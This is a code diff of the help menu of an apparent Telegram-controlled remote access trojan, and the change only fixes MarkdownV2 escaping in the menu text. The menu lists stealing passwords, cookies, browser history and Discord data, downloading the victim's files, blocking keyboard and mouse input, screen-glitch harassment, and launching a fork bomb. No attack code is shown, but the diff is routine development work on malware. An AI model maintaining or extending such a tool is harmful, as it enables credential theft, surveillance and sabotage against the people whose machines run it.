@@ -198,10 +198,10 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*🔊 AUDIO & VISUAL MISCHIEF*\n"
         "`/tts <male|female> <msg>` \\- Play Text\\-to\\-Speech\n"
         "`/flashscreen <effect>` \\- Apply visual screen glitch\n"
-        "  *Effects: invert, noise, lines, color_squares*\n"
+        "  *Effects: invert, noise, lines, color\\_squares*\n"
         "`/stopflashscreen` \\- Stop the visual effect\n\n"
 
-        "*🚫 SYSTEM CONTROL (Admin)*\n"
+        "*🚫 SYSTEM CONTROL \\(Admin\\)*\n"
         "`/blockwebsite <url>` \\- Block website access\n"
         "`/unblockwebsite <domain>` \\- Unblock a website\n"
         "`/blockkeyboard` \\- Disable keyboard input\n"
@@ -210,7 +210,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/unblockmouse` \\- Enable mouse input\n\n"
 
         "*🔑 DATA EXFILTRATION*\n"
-        "`/grab <type>` \\- Steal data (passwords, cookies, etc\\.)\n"
+        "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n"
         "  *Types: all, passwords, cookies, history, discord*\n\n"
         
         "*📁 FILE SYSTEM*\n"
@@ -218,7 +218,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/cd <dir>` \\- Change directory\n"
         "`/download <file>` \\- Download a file\n\n"
         
-        "*💣 DESTRUCTIVE & ADVANCED (Admin)*\n"
+        "*💣 DESTRUCTIVE & ADVANCED \\(Admin\\)*\n"
         "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
         "`/cancelforkbomb` \\- Stop the fork bomb\n"
         "`/destroy <id> CONFIRM` \\- Uninstall the agent\n\n"
